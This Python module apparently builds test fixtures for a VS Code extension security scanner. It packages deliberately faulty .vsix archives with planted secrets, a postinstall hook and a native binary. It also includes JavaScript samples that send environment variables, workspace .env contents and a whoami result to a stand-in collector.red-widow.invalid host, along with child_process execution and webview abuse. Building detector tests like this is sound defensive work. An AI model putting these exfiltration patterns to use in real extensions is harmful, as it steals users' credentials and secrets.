from __future__ import annotations

import json
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Mapping


VsixContent = str | bytes


@dataclass(frozen=True)
class VsixFixtureSpec:
    name: str
    manifest: dict[str, object]
    files: dict[str, VsixContent]


FIXED_ZIP_TIMESTAMP = (2024, 1, 1, 0, 0, 0)


def build_vsix(
    path: str | Path,
    manifest: Mapping[str, object],
    files: Mapping[str, VsixContent],
) -> Path:
    output_path = Path(path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    manifest_payload = dict(manifest)
    entries: dict[str, VsixContent] = {"extension/package.json": _json_bytes(manifest_payload)}
    entries.update(files)

    with zipfile.ZipFile(output_path, "w") as archive:
        for name in sorted(entries):
            archive.writestr(_zip_info(name), _to_bytes(entries[name]))
    return output_path


def build_faulty_vsix(path: str | Path, fixture: str = "kitchen-sink") -> Path:
    spec = faulty_fixture(fixture)
    return build_vsix(path, spec.manifest, spec.files)


def faulty_fixture(name: str) -> VsixFixtureSpec:
    try:
        return FAULTY_FIXTURES[name]
    except KeyError as exc:
        available = ", ".join(sorted(FAULTY_FIXTURES))
        raise ValueError(f"unknown fixture {name!r}; available fixtures: {available}") from exc


def _base_manifest(name: str) -> dict[str, object]:
    return {
        "publisher": "red-widow-fixtures",
        "name": name,
        "version": "0.0.1",
        "main": "./out/extension.js",
        "activationEvents": ["*"],
        "engines": {"vscode": "^1.90.0"},
    }


def _spec(
    name: str,
    files: Mapping[str, VsixContent],
    manifest: Mapping[str, object] | None = None,
) -> VsixFixtureSpec:
    payload = _base_manifest(name)
    if manifest:
        payload.update(manifest)
    return VsixFixtureSpec(name=name, manifest=payload, files=dict(files))


def _json_bytes(payload: Mapping[str, object]) -> bytes:
    return (json.dumps(payload, sort_keys=True, separators=(",", ":")) + "\n").encode("utf-8")


def _to_bytes(content: VsixContent) -> bytes:
    return content if isinstance(content, bytes) else content.encode("utf-8")


def _zip_info(name: str) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, FIXED_ZIP_TIMESTAMP)
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o644 << 16
    return info


FAULTY_FIXTURES: dict[str, VsixFixtureSpec] = {
    "bundled-secrets": _spec(
        "bundled-secrets",
        {
            "extension/out/extension.js": "exports.activate = function activate() {};\n",
            "extension/.env": "TOKEN=red-widow-fixture-secret-value\n",
            "extension/id_rsa": (
                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                "red-widow-fixture\n"
                "-----END OPENSSH PRIVATE KEY-----\n"
            ),
        },
    ),
    "lifecycle-script": _spec(
        "lifecycle-script",
        {"extension/out/extension.js": "exports.activate = function activate() {};\n"},
        {"scripts": {"postinstall": "node ./scripts/install.js"}},
    ),
    "native-binary": _spec(
        "native-binary",
        {
            "extension/out/extension.js": "exports.activate = function activate() {};\n",
            "extension/bin/helper.node": b"\x7fELF\x01\x02red-widow-fixture",
        },
    ),
    "child-process": _spec(
        "child-process",
        {
            "extension/out/extension.js": (
                "const cp = require('child_process');\n"
                "exports.activate = function activate() { cp.exec('id'); };\n"
            ),
        },
    ),
    "network-exfil": _spec(
        "network-exfil",
        {
            "extension/out/extension.js": (
                "exports.activate = async function activate() {\n"
                "  await fetch('https://collector.red-widow.invalid/upload', {method: 'POST', body: 'fixture'});\n"
                "};\n"
            ),
        },
    ),
    "webview-abuse": _spec(
        "webview-abuse",
        {
            "extension/out/extension.js": (
                "const vscode = require('vscode');\n"
                "exports.activate = function activate() {\n"
                "  const panel = vscode.window.createWebviewPanel('rw', 'RW', vscode.ViewColumn.One, { enableScripts: true });\n"
                "  panel.webview.html = '<html><body><script>acquireVsCodeApi().postMessage({cmd:\"run\"})</script></body></html>';\n"
                "  panel.webview.onDidReceiveMessage((message) => console.log(message.cmd));\n"
                "};\n"
            ),
        },
    ),
    "terminal-command": _spec(
        "terminal-command",
        {
            "extension/out/extension.js": (
                "const vscode = require('vscode');\n"
                "exports.activate = function activate() {\n"
                "  const terminal = vscode.window.createTerminal('rw-fixture');\n"
                "  terminal.sendText('curl https://collector.red-widow.invalid/$(whoami)');\n"
                "};\n"
            ),
        },
    ),
    "env-sweep": _spec(
        "env-sweep",
        {
            "extension/out/extension.js": (
                "exports.activate = function activate() {\n"
                "  const env = Object.entries(process.env).map(([key, value]) => `${key}=${value}`).join('\\n');\n"
                "  return fetch('https://collector.red-widow.invalid/env', {method: 'POST', body: env});\n"
                "};\n"
            ),
        },
    ),
    "dynamic-canary-exfiltration": _spec(
        "dynamic-canary-exfiltration",
        {
            "extension/out/extension.js": (
                "const fs = require('fs');\n"
                "const path = require('path');\n"
                "const vscode = require('vscode');\n"
                "exports.activate = function activate() {\n"
                "  const root = vscode.workspace.workspaceFolders[0].uri.fsPath;\n"
                "  const secret = fs.readFileSync(path.join(root, '.env'), 'utf8');\n"
                "  return fetch('https://collector.red-widow.invalid/upload', {method: 'POST', body: secret});\n"
                "};\n"
            ),
        },
    ),
}


FAULTY_FIXTURES["kitchen-sink"] = _spec(
    "kitchen-sink",
    {
        "extension/out/extension.js": (
            "const fs = require('fs');\n"
            "const path = require('path');\n"
            "const cp = require('child_process');\n"
            "const vscode = require('vscode');\n"
            "exports.activate = async function activate(context) {\n"
            "  const root = vscode.workspace.workspaceFolders[0].uri.fsPath;\n"
            "  const secret = fs.readFileSync(path.join(root, '.env'), 'utf8');\n"
            "  const env = Object.entries(process.env).map(([key, value]) => `${key}=${value}`).join('\\n');\n"
            "  context.secrets.get('token');\n"
            "  const terminal = vscode.window.createTerminal('rw-fixture');\n"
            "  terminal.sendText('curl https://collector.red-widow.invalid/terminal');\n"
            "  const panel = vscode.window.createWebviewPanel('rw', 'RW', vscode.ViewColumn.One, { enableScripts: true });\n"
            "  panel.webview.html = '<html><body><script>acquireVsCodeApi().postMessage({cmd:\"run\"})</script></body></html>';\n"
            "  panel.webview.onDidReceiveMessage((message) => console.log(message.cmd));\n"
            "  const body = secret + '\\n' + env;\n"
            "  await fetch('https://collector.red-widow.invalid/upload', {method: 'POST', body});\n"
            "  fs.writeFileSync(path.join(root, 'downloaded-helper'), body);\n"
            "  cp.execFile(path.join(root, 'downloaded-helper'));\n"
            "};\n"
        ),
        "extension/.env": "TOKEN=red-widow-fixture-secret-value\n",
        "extension/bin/helper.node": b"\x7fELF\x01\x02red-widow-fixture",
    },
    {"scripts": {"postinstall": "node ./scripts/install.js"}},
)
